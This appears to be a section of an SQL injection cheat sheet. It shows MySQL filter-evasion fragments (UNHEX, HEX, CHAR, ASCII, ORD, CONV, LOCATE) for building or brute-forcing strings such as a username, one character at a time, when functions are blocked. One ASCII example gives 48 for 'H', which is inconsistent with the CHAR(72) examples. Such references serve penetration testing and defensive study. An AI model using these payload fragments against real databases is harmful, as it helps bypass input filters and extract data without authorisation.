The following are useful alternatives if functions are filtered/blocked.
## Building Strings
### UNHEX, HEX, CHAR, ASCII, ORD, etc...
Each DBMS provides its functions for doing this. In MySQL, the `UNHEX` is useful for translating hexadecimal numbers to string:
```sql
... SUBSTR(USERNAME,1,1)=UNHEX(48)
... SUBSTR(USERNAME,1,2)=UNHEX(4845)
... SUBSTR(USERNAME,1,5)=UNHEX('48454C4C4F')
... SUBSTR(USERNAME,1,5)=0x48454C4C4F
```

Furthermore, the `HEX` function is useful to convert to hexadecimal:
```sql
... HEX(SUBSTR(USERNAME,1,1))=48
... HEX(SUBSTR(USERNAME,1,2))=4845
... HEX(SUBSTR(USERNAME,1,5))='48454C4C4F'
```

We can also use the `CHAR` function as seen below:
```sql
... SUBSTR(USERNAME,1,1)=CHAR(72)
... SUBSTR(USERNAME,1,2)=CHAR(72,69)
... SUBSTR(USERNAME,1,2)=CONCAT(CHAR(72),CHAR(69))
```

There is also a set of twin functions: `ASCII` and `ORD`. For example:
```sql
... ASCII(SUBSTR(USERNAME,1,1))=48
... ORD(SUBSTR(USERNAME,1,1))=48
```

In MySQL, the `CONV` function is a method for returning the string representation of a number from two bases. For example:
```sql
CONV(10,10,36) // returns 'a'
CONV(11,10,36) // returns 'b'
```
>Note: The highest base we can use is 36. We also cannot use it for Unicode characters.

We can also mix the results with upper and lower functions as seen below:
```sql
LOWER(CONV(10,10,36)) // 'a'
LCASE(CONV(10,10,36)) // 'a'
UPPER(CONV(10,10,36)) // 'A'
UCASE(CONV(10,10,36)) // 'A'
```
### Brute-force Strings
If we cannot build a string, we can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings. For example:
```sql
IF(LOCATE('H',SUBSTR(USERNAME,1,1)),1,0)
```
>Note: Alternatively, we can use `INSTR` and `POSITION`.

